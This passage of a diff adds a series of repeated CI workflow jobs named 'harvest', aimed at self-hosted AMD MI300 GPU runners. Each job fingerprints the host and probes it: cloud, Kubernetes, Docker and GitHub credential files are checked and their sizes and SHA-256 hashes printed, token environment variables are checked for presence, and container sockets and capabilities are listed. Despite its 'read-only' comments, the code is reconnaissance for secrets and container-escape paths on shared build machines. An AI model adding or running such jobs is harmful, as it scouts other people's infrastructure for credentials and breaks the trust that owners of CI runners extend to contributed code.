+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-13 nonce=$NONCE"
+          exit 0
+  job-mi300x8-14:
+    name: harvest-14
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-14 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-14 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-14 nonce=$NONCE"
+          exit 0
+  job-mi300x8-15:
+    name: harvest-15
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-15 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-15 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-15 nonce=$NONCE"
+          exit 0
+  job-mi300x8-16:
+    name: harvest-16
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-16 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-16 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-16 nonce=$NONCE"
+          exit 0
+  job-mi300x8-17:
+    name: harvest-17
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-17 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-17 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-17 nonce=$NONCE"
+          exit 0
+  job-mi300x8-18:
+    name: harvest-18
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-18 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-18 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-18 nonce=$NONCE"
+          exit 0
+  job-mi300x8-19:
+    name: harvest-19
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-19 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-19 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-19 nonce=$NONCE"
+          exit 0
+  job-mi300x8-20:
+    name: harvest-20
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
